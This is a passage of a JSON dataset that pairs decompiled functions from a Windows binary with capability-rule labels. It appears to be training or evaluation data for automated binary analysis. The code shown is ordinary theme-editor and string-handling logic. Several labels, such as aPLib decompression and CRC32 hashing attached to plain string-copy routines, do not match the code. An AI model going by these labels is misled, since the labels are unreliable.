            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18004fb50(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar4 != -1) {\n        iVar5 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0);\n        if (iVar5 != -1) {\n            iVar1 = *(*(arg1 + 200) + 0x38 + iVar4 * 0x48);\n            iVar2 = *(*(arg1 + 200) + 0x30 + iVar4 * 0x48);\n            uVar3 = (**0x1800de798)(*(arg1 + 0x18), 0x240c);\n            (**0x1800de770)(uVar3, iVar5 < iVar1 - iVar2 >> 4);\n            fcn.18004fc00(arg1);\n            fcn.18004ff70(arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "18004fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18004fc00(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong uVar4;\n    \n    iVar1 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if ((iVar1 != -1) && (iVar2 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0),  iVar2 != -1)) {\n        uVar4 = 0;\n        iVar1 = *(*(arg1 + 200) + 0x38 + iVar1 * 0x48) - *(*(arg1 + 200) + 0x30 + iVar1 * 0x48) >> 4;\n        uVar3 = (**0x1800de798)(*(arg1 + 0x18), 0x2407);\n        (**0x1800de770)(uVar3, iVar2 < iVar1 + -1);\n        if ((0 < iVar2) && (iVar2 < iVar1)) {\n            uVar4 = 1;\n        }\n        uVar3 = (**0x1800de798)(*(arg1 + 0x18), 0x2408);\n        (**0x1800de770)(uVar3, uVar4);\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "1800503c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800503c0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_DL;\n    uint *puVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    uchar auStack328 [32];\n    uint uStack296;\n    uint uStack292;\n    ulong uStack288;\n    uchar auStack280 [32];\n    uchar auStack248 [208];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack328;\n    iVar2 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0);\n    if (iVar2 != -1) {\n        iVar3 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0);\n        if (iVar3 == -1) {\n            iVar3 = -1;\n        }\n        if ((in_DL == '\\0') || (iVar3 != -1)) {\n            uStack296 = (**0x1800de7f0)(*0x18012a390, 0x843, 0);\n            uStack292 = (**0x1800de7f0)(*0x18012a390, 0x842, 0);\n            uStack288 = 0;\n            iVar1 = *(arg1 + 200) + iVar2 * 0x48;\n            uVar6 = *(*(arg1 + 200) + 0x38 + iVar2 * 0x48) - *(iVar1 + 0x30) >> 4;\n            iVar2 = uVar6;\n            if (iVar2 < 99) {\n                fcn.180020a90(auStack280, 10, L\"Style #%02i\", uVar6 & 0xffffffff);\n                if (in_DL != '\\0') {\n                    puVar4 = iVar3 * 0x10 + *(iVar1 + 0x30);\n                    uStack296 = *puVar4;\n                    uStack292 = puVar4[1];\n                    uStack288 = *(puVar4 + 2);\n                }\n                puVar4 = *(iVar1 + 0x38);\n                if (puVar4 == *(iVar1 + 0x40)) {\n                    fcn.180052040(iVar1 + 0x30, puVar4, &uStack296);\n                }\n                else {\n                    *puVar4 = uStack296;\n                    puVar4[1] = uStack292;\n                    puVar4[2] = uStack288;\n                    puVar4[3] = uStack288._4_4_;\n                    *(iVar1 + 0x38) = *(iVar1 + 0x38) + 0x10;\n                }\n                (**0x1800de7f0)(*(arg1 + 0xc0), 0x181, iVar2, auStack280);\n                (**0x1800de7f0)(*(arg1 + 0xc0), 0x186, iVar2, 0);\n                fcn.18004fb50(arg1);\n                fcn.180050280(arg1, 0, 0x1d);\n                *(arg1 + 0xb5) = 0;\n                fcn.18004fcf0(arg1);\n            }\n            else {\n                fcn.180020a90(auStack248, 100, L\"Only %i Styles can be defined per Theme.\", 99);\n                uVar5 = 0x1800fa3c0;\n                if (in_DL != '\\0') {\n                    uVar5 = 0x1800fa3e0;\n                }\n                (**0x1800de710)(*(arg1 + 0x18), auStack248, uVar5, 0x10);\n            }\n        }\n    }\n    fcn.18008fb00(uStack40 ^ auStack328);\n    return;\n}\n",
        "token_count": 889
    },
    "180050d3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180050d30(int64_t arg1)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong in_RDX;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    ushort *puVar11;\n    uchar extraout_XMM0 [16];\n    uchar auStack200 [32];\n    ulong uStack168;\n    int64_t aiStack160 [3];\n    uint64_t uStack136;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar auStack72 [16];\n    int64_t iStack56;\n    uint64_t uStack40;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack200;\n    cVar4 = fcn.180051230(arg1, CONCAT71(in_RDX >> 8, 1));\n    if ((cVar4 == '\\0') || (iVar5 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0),  iVar5 == -1))\n    goto code_r0x0001800510a5;\n    arg1_00 = arg1 + 200;\n    iVar1 = *arg1_00 + iVar5 * 0x48;\n    uStack104 = *0x180101900;\n    uStack100 = *0x180101904;\n    uStack96 = *0x180101908;\n    uStack92 = *0x18010190c;\n    iVar8 = 0;\n    uStack120._0_2_ = 0;\n    uStack88 = 0;\n    uStack84 = 0;\n    uStack80 = 0;\n    uStack76 = 0;\n    auStack72 = ZEXT816(0);\n    iStack56 = 0;\n    puVar6 = fcn.18002e5c0(aiStack160, iVar1, L\"_clone\");\n    if (&uStack120 != puVar6) {\n        if (7 < CONCAT44(uStack92, uStack96)) {\n            iVar3 = CONCAT44(uStack116, CONCAT22(uStack120._2_2_, uStack120));\n            iVar7 = iVar3;\n            if ((0xfff < CONCAT44(uStack92, uStack96) * 2 + 2) && (iVar7 = *(iVar3 + -8),  0x1f < (iVar3 - iVar7) - 8U))\n            goto code_r0x0001800510d4;\n            fcn.18008fb24(iVar7);\n        }\n        uStack116 = puVar6[1];\n        uStack112 = puVar6[2];\n        uStack108 = puVar6[3];\n        uStack120._0_2_ = *puVar6;\n        uStack120._2_2_ = *puVar6 >> 0x10;\n        uStack104 = puVar6[4];\n        uStack100 = puVar6[5];\n        uStack96 = puVar6[6];\n        uStack92 = puVar6[7];\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n    }\n    if (7 < uStack136) {\n        iVar7 = aiStack160[0];\n        if ((0xfff < uStack136 * 2 + 2) && (iVar7 = *(aiStack160[0] + -8),  0x1f < (aiStack160[0] - iVar7) - 8U))\n        goto code_r0x0001800510d4;\n        fcn.18008fb24(iVar7);\n    }\n    uVar10 = *(iVar1 + 0x38) - *(iVar1 + 0x30) >> 4;\n    uVar9 = auStack72._8_8_ - auStack72._0_8_ >> 4;\n    if (uVar10 < uVar9) {\n        auStack72 = CONCAT88(uVar10 * 0x10 + auStack72._0_8_, auStack72._0_8_);\n    }\n    else if (uVar9 < uVar10) {\n        if (iStack56 - auStack72._0_8_ >> 4 < uVar10) {\n            fcn.180052440(auStack72, uVar10);\n        }\n        else {\n            for (iVar7 = uVar10 - uVar9; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *auStack72._8_8_ = 0;\n                auStack72._8_8_[1] = 0;\n                auStack72._8_8_ = auStack72._8_8_ + 2;\n            }\n        }\n    }\n    for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *(auStack72._0_8_ + iVar8) = *(iVar8 + *(iVar1 + 0x30));\n        *(auStack72._0_8_ + 4 + iVar8) = *(iVar8 + 4 + *(iVar1 + 0x30));\n        *(auStack72._0_8_ + 8 + iVar8) = *(iVar8 + 8 + *(iVar1 + 0x30));\n        *(auStack72._0_8_ + 0xc + iVar8) = *(iVar8 + 0xc + *(iVar1 + 0x30));\n        iVar8 = iVar8 + 0x10;\n    }\n    iVar8 = *(arg1 + 0xd0);\n    if (iVar8 == *(arg1 + 0xd8)) {\n        fcn.180051e80(arg1_00, iVar8, &uStack120);\n    }\n    else {\n        fcn.18004dab0(iVar8, &uStack120);\n        *(arg1 + 0xd0) = *(arg1 + 0xd0) + 0x48;\n    }\n    puVar11 = &uStack120;\n    if (7 < CONCAT44(uStack92, uStack96)) {\n        puVar11 = CONCAT44(uStack116, CONCAT22(uStack120._2_2_, uStack120));\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, puVar11);\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, (*(arg1 + 0xd0) - *arg1_00) / 0x48 + -1, 0);\n    fcn.18004f110(arg1);\n    *(arg1 + 0xb5) = 0;\n    fcn.18004f340(arg1);\n    if (auStack72._0_8_ == 0) {\ncode_r0x000180051069:\n        if (CONCAT44(uStack92, uStack96) < 8) {\ncode_r0x0001800510a5:\n            fcn.18008fb00(uStack40 ^ auStack200);\n            return;\n        }\n        uVar10 = CONCAT44(uStack92, uStack96) * 2 + 2;\n        iVar1 = CONCAT44(uStack116, CONCAT22(uStack120._2_2_, uStack120));\n        iVar8 = iVar1;\n        if ((uVar10 < 0x1000) || (iVar8 = *(iVar1 + -8),  (iVar1 - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            goto code_r0x0001800510a5;\n        }\n    }\n    else {\n        uVar10 = iStack56 - auStack72._0_8_ & 0xfffffffffffffff0;\n        iVar8 = auStack72._0_8_;\n        if ((uVar10 < 0x1000) || (iVar8 = *(auStack72._0_8_ + -8),  (auStack72._0_8_ - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            auStack72 = extraout_XMM0 & 0x0;\n            iStack56 = 0;\n            goto code_r0x000180051069;\n        }\n    }\n    fcn.1800b3528(iVar8, uVar10 + 0x27);\ncode_r0x0001800510d4:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2042
    },
    "1800510e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.1800510e0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t arg1_00;\n    int64_t iVar5;\n    int64_t iVar6;\n    \n    uVar2 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    uVar1 = uVar2;\n    if (uVar1 == 0xffffffff) {\n        return uVar2;\n    }\n    iVar5 = *(arg1 + 0xd0);\n    iVar6 = *(arg1 + 200) + (uVar1 + 1) * 0x48;\n    if (iVar6 != iVar5) {\n        arg1_00 = iVar6 + -0x18;\n        do {\n            fcn.18000d960(arg1_00 + -0x30, iVar6);\n            *(arg1_00 + -0x10) = *(arg1_00 + 0x38);\n            *(arg1_00 + -0xc) = *(arg1_00 + 0x3c);\n            *(arg1_00 + -8) = *(arg1_00 + 0x40);\n            *(arg1_00 + -4) = *(arg1_00 + 0x44);\n            fcn.180051da0(arg1_00, arg1_00 + 0x48);\n            iVar6 = iVar6 + 0x48;\n            arg1_00 = arg1_00 + 0x48;\n        } while (iVar6 != iVar5);\n        iVar5 = *(arg1 + 0xd0);\n    }\n    fcn.18004db60(iVar5 + -0x48);\n    *(arg1 + 0xd0) = *(arg1 + 0xd0) + -0x48;\n    iVar6 = *(arg1 + 0xd0) - *(arg1 + 200);\n    iVar6 = iVar6 / 0x12 + (iVar6 >> 0x3f);\n    iVar3 = (iVar6 >> 2) - (iVar6 >> 0x3f);\n    uVar4 = iVar3 - 1;\n    if (uVar1 <= iVar3 + -2) {\n        uVar4 = uVar1;\n    }\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x182, uVar1, 0);\n    (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, uVar4, 0);\n    *(arg1 + 0xb5) = 0x100;\n    fcn.18004f110(arg1);\n    return uVar4;\n}\n",
        "token_count": 635
    },
    "180051bb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180051bb0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    char in_DL;\n    ulong noname_2;\n    ushort *puVar6;\n    uchar auStack136 [32];\n    ushort *puStack104;\n    ulong uStack88;\n    ushort uStack80;\n    unkbyte6 Stack78;\n    ulong uStack64;\n    uint64_t uStack56;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack136;\n    iVar4 = arg1;\n    fcn.18003cb00();\n    fcn.18003cc00(iVar4, *(arg1 + 0x18), 1);\n    if (in_DL != '\\0') {\n        noname_2 = 0;\n        iVar3 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n        if (iVar3 == -1) goto code_r0x000180051d0d;\n        uStack32 = *0x180101900;\n        uStack28 = *0x180101904;\n        uStack24 = *0x180101908;\n        uStack20 = *0x18010190c;\n        uStack48 = 0;\n        uStack64 = CONCAT44(*0x180101904, *0x180101900);\n        uStack56 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack80 = 0;\n        puStack104 = &uStack80;\n        fcn.18004e000(arg1, iVar3, noname_2, &uStack48);\n        puVar6 = &uStack80;\n        if (7 < uStack56) {\n            puVar6 = CONCAT62(Stack78, uStack80);\n        }\n        (**0x1800de788)(*0x180123eb8, 0x24ba, puVar6);\n        if (7 < uStack56) {\n            iVar5 = CONCAT62(Stack78, uStack80);\n            iVar4 = iVar5;\n            if ((0xfff < uStack56 * 2 + 2) && (iVar4 = *(iVar5 + -8),  0x1f < (iVar5 - iVar4) - 8U))\n            goto code_r0x000180051d31;\n            fcn.18008fb24(iVar4);\n        }\n        uStack64 = CONCAT44(*0x180101904, *0x180101900);\n        uStack56 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack80 = 0;\n        if (7 < CONCAT44(uStack20, uStack24)) {\n            iVar4 = CONCAT44(uStack20, uStack24) * 2;\n            iVar2 = CONCAT62(Stack46, uStack48);\n            iVar5 = iVar2;\n            if (0xfff < iVar4 + 2U) {\n                iVar5 = *(iVar2 + -8);\n                if (0x1f < (iVar2 - iVar5) - 8U) {\n                    fcn.1800b3528(uStack64, iVar5, iVar4 + 0x29);\ncode_r0x000180051d31:\n                    fcn.1800b3528();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar5);\n        }\n    }\ncode_r0x000180051d0d:\n    fcn.18008fb00(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 877
    },
    "18009e02": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18009e028(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    iVar2 = *(arg1 + 0xe0);\n    iVar5 = 0;\n    if (0 < iVar2) {\n        uVar6 = 0;\n        do {\n            iVar3 = iVar5 >> 4;\n            if (iVar3 < 4) {\n                piVar4 = *(*(arg1 + 0xe8) + iVar3 * 8);\n            }\n            else {\n                piVar4 = *(*(arg1 + 0xe8) + 0x18);\n                iVar3 = iVar3 + -3;\n                do {\n                    piVar4 = piVar4[1];\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((arg2 <= *(*piVar4 + 4 + (uVar6 & 0xf) * 8)) &&\n               ((*(arg1 + 0x70) == -1 || (*(arg1 + 0x70) == arg2 || *(arg1 + 0x70) < arg2)))) {\n                LOCK();\n                piVar1 = *piVar4 + (uVar6 & 0xf) * 8;\n                *piVar1 = *piVar1 + 1;\n            }\n            iVar5 = iVar5 + 1;\n            uVar6 = uVar6 + 1;\n        } while (iVar5 < iVar2);\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "1800af14": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.1800af148(void)\n\n{\n    if (*0x1801231d0 != 0xffffffff) {\n        fcn.1800b09b0(*0x1801231d0);\n        *0x1801231d0 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 69
    },
    "1800c42b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.1800c42b4(void)\n\n{\n    if (*0x180123408 != 0xffffffff) {\n        fcn.1800c65d0(*0x180123408);\n        *0x180123408 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 65
    },
    "180004ab": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong * fcn.180004ab0(ulong noname_0, ulong *arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong arg1;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong *arg2_00;\n    \n    arg2[2] = 0;\n    if (arg3 < 6) {\n        arg2[3] = 0;\n        iVar6 = arg3 * 0x20;\n        arg2_00 = iVar6 + 0x1801253f8;\n        uVar1 = *(iVar6 + 0x180125408);\n        if (7 < *(iVar6 + 0x180125410)) {\n            arg2_00 = *arg2_00;\n        }\n        if (uVar1 < 8) {\n            uVar2 = *(arg2_00 + 4);\n            uVar3 = *(arg2_00 + 1);\n            uVar4 = *(arg2_00 + 0xc);\n            uVar5 = 7;\n            *arg2 = *arg2_00;\n            *(arg2 + 4) = uVar2;\n            *(arg2 + 1) = uVar3;\n            *(arg2 + 0xc) = uVar4;\n        }\n        else {\n            uVar5 = uVar1 | 7;\n            if (0x7ffffffffffffffe < uVar5) {\n                uVar5 = 0x7ffffffffffffffe;\n            }\n            arg1 = fcn.180011cf0(arg2, uVar5 + 1);\n            *arg2 = arg1;\n            fcn.1800ade80(arg1, arg2_00, uVar1 * 2 + 2);\n        }\n        arg2[2] = uVar1;\n        arg2[3] = uVar5;\n        return arg2;\n    }\n    arg2[3] = 7;\n    *arg2 = 0;\n    fcn.180010d70(arg2, 0x1800f4614, 0);\n    return arg2;\n}\n",
        "token_count": 482
    },
    "180010d7": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t ** fcn.180010d70(int64_t **arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    int64_t arg2_00;\n    int64_t *piVar6;\n    \n    piVar1 = arg1[3];\n    if (piVar1 < arg3) {\n        if (0x7ffffffffffffffe < arg3) {\n            fcn.180014b60();\n            pcVar2 = swi(3);\n            ppiVar3 = (*pcVar2)();\n            return ppiVar3;\n        }\n        piVar4 = arg3 | 7;\n        piVar6 = 0x7ffffffffffffffe;\n        if (((piVar4 < 0x7fffffffffffffff) && (piVar1 <= 0x7ffffffffffffffe - (piVar1 >> 1))) &&\n           (piVar5 = (piVar1 >> 1) + piVar1,  piVar6 = piVar4,  piVar4 < piVar5)) {\n            piVar6 = piVar5;\n        }\n        arg2_00 = piVar6 + 1;\n        if (piVar6 == 0xffffffffffffffff) {\n            arg2_00 = -1;\n        }\n        piVar4 = fcn.180011cf0(arg1, arg2_00);\n        arg1[3] = piVar6;\n        arg1[2] = arg3;\n        fcn.1800ade80(piVar4, arg2, arg3 * 2);\n        *(arg3 * 2 + piVar4) = 0;\n        if (0x7 < piVar1) {\n            piVar6 = *arg1;\n            piVar5 = piVar6;\n            if (0xfff < piVar1 * 2 + 2U) {\n                piVar5 = piVar6[-1];\n                if (0x1f < (piVar6 - piVar5) - 8U) {\n                    fcn.1800b3528(piVar6 - piVar5, piVar1 * 2 + 0x29);\n                    pcVar2 = swi(3);\n                    ppiVar3 = (*pcVar2)();\n                    return ppiVar3;\n                }\n            }\n            fcn.18008fb24(piVar5);\n        }\n        *arg1 = piVar4;\n    }\n    else {\n        ppiVar3 = arg1;\n        if (0x7 < piVar1) {\n            ppiVar3 = *arg1;\n        }\n        arg1[2] = arg3;\n        fcn.1800ade80(ppiVar3, arg2, arg3 * 2);\n        *(arg3 * 2 + ppiVar3) = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 652
    },
    "180010c2": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t ** fcn.180010c20(int64_t **arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    int64_t arg2_00;\n    int64_t **ppiVar7;\n    ushort in_R8W;\n    \n    piVar4 = arg1[3];\n    if (arg2 <= piVar4) {\n        ppiVar3 = arg1;\n        if (0x7 < piVar4) {\n            ppiVar3 = *arg1;\n        }\n        arg1[2] = arg2;\n        piVar4 = arg2;\n        ppiVar7 = ppiVar3;\n        if (arg2 != NULL) {\n            for (; piVar4 != NULL; piVar4 = piVar4 + -1) {\n                *ppiVar7 = in_R8W;\n                ppiVar7 = ppiVar7 + 2;\n            }\n        }\n        *(ppiVar3 + arg2 * 2) = 0;\n        return arg1;\n    }\n    if (0x7ffffffffffffffe < arg2) {\n        fcn.180014b60();\n        pcVar1 = swi(3);\n        ppiVar3 = (*pcVar1)();\n        return ppiVar3;\n    }\n    piVar5 = arg2 | 7;\n    piVar6 = 0x7ffffffffffffffe;\n    if (((piVar5 < 0x7fffffffffffffff) && (piVar4 <= 0x7ffffffffffffffe - (piVar4 >> 1))) &&\n       (piVar2 = (piVar4 >> 1) + piVar4,  piVar6 = piVar5,  piVar5 < piVar2)) {\n        piVar6 = piVar2;\n    }\n    arg2_00 = piVar6 + 1;\n    if (piVar6 == 0xffffffffffffffff) {\n        arg2_00 = -1;\n    }\n    piVar2 = fcn.180011cf0(arg1, arg2_00);\n    arg1[2] = arg2;\n    arg1[3] = piVar6;\n    piVar6 = arg2;\n    piVar5 = piVar2;\n    if (arg2 != NULL) {\n        for (; piVar6 != NULL; piVar6 = piVar6 + -1) {\n            *piVar5 = in_R8W;\n            piVar5 = piVar5 + 2;\n        }\n    }\n    *(piVar2 + arg2 * 2) = 0;\n    if (0x7 < piVar4) {\n        piVar6 = *arg1;\n        piVar5 = piVar6;\n        if (0xfff < piVar4 * 2 + 2U) {\n            piVar5 = piVar6[-1];\n            if (0x1f < (piVar6 - piVar5) - 8U) {\n                fcn.1800b3528(piVar6 - piVar5, piVar4 * 2 + 0x29);\n                pcVar1 = swi(3);\n                ppiVar3 = (*pcVar1)();\n                return ppiVar3;\n            }\n        }\n        fcn.18008fb24(piVar5);\n    }\n    *arg1 = piVar2;\n    return arg1;\n}\n",
        "token_count": 773
    },
    "180010fa": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t ** fcn.180010fa0(int64_t **arg1, int64_t *arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t arg1_00;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    uint64_t arg1_01;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    char in_R8B;\n    \n    piVar1 = arg1[3];\n    if (arg2 <= piVar1) {\n        ppiVar4 = arg1;\n        if (0xf < piVar1) {\n            ppiVar4 = *arg1;\n        }\n        arg1[2] = arg2;\n        fcn.1800ae290(ppiVar4, in_R8B, arg2);\n        *(arg2 + ppiVar4) = 0;\n        return arg1;\n    }\n    if (0x7fffffffffffffff < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        ppiVar4 = (*pcVar2)();\n        return ppiVar4;\n    }\n    piVar5 = arg2 | 0xf;\n    piVar7 = 0x7fffffffffffffff;\n    if (((piVar5 < 0x8000000000000000) && (piVar1 <= 0x7fffffffffffffff - (piVar1 >> 1))) &&\n       (piVar6 = (piVar1 >> 1) + piVar1,  piVar7 = piVar5,  piVar5 < piVar6)) {\n        piVar7 = piVar6;\n    }\n    arg1_00 = piVar7 + 1;\n    if (piVar7 == 0xffffffffffffffff) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    if (arg1_00 < 0x1000) {\n        if (arg1_00 == 0) {\n            piVar5 = NULL;\n        }\n        else {\n            piVar5 = fcn.18008fb2c(arg1_00);\n        }\n    }\n    else {\n        arg1_01 = arg1_00 + 0x27;\n        if (arg1_01 <= arg1_00) {\n            arg1_01 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(arg1_01);\n        if (iVar3 == 0) goto code_r0x0001800110f2;\n        piVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        piVar5[-1] = iVar3;\n    }\n    arg1[2] = arg2;\n    arg1[3] = piVar7;\n    fcn.1800ae290(piVar5, in_R8B, arg2);\n    *(arg2 + piVar5) = 0;\n    if (0xf < piVar1) {\n        piVar7 = *arg1;\n        piVar6 = piVar7;\n        if ((0xfff < piVar1 + 1U) && (piVar6 = piVar7[-1],  0x1f < piVar7 + (-8 - piVar6))) {\ncode_r0x0001800110f2:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            ppiVar4 = (*pcVar2)();\n            return ppiVar4;\n        }\n        fcn.18008fb24(piVar6);\n    }\n    *arg1 = piVar5;\n    return arg1;\n}\n",
        "token_count": 806
    },
    "18001112": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint64_t ** fcn.180011120(int64_t **arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    uint64_t arg1_00;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    uint64_t arg1_01;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    ulong var_8h;\n    \n    piVar1 = arg1[3];\n    if (arg3 <= piVar1) {\n        ppiVar4 = arg1;\n        if (0xf < piVar1) {\n            ppiVar4 = *arg1;\n        }\n        arg1[2] = arg3;\n        fcn.1800ade80(ppiVar4, arg2, arg3);\n        *(arg3 + ppiVar4) = 0;\n        return arg1;\n    }\n    if (0x7fffffffffffffff < arg3) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        ppiVar4 = (*pcVar2)();\n        return ppiVar4;\n    }\n    piVar5 = arg3 | 0xf;\n    piVar7 = 0x7fffffffffffffff;\n    if (((piVar5 < 0x8000000000000000) && (piVar1 <= 0x7fffffffffffffff - (piVar1 >> 1))) &&\n       (piVar6 = (piVar1 >> 1) + piVar1,  piVar7 = piVar5,  piVar5 < piVar6)) {\n        piVar7 = piVar6;\n    }\n    arg1_00 = piVar7 + 1;\n    if (piVar7 == 0xffffffffffffffff) {\n        arg1_00 = 0xffffffffffffffff;\n    }\n    if (arg1_00 < 0x1000) {\n        if (arg1_00 == 0) {\n            piVar5 = NULL;\n        }\n        else {\n            piVar5 = fcn.18008fb2c(arg1_00);\n        }\n    }\n    else {\n        arg1_01 = arg1_00 + 0x27;\n        if (arg1_01 <= arg1_00) {\n            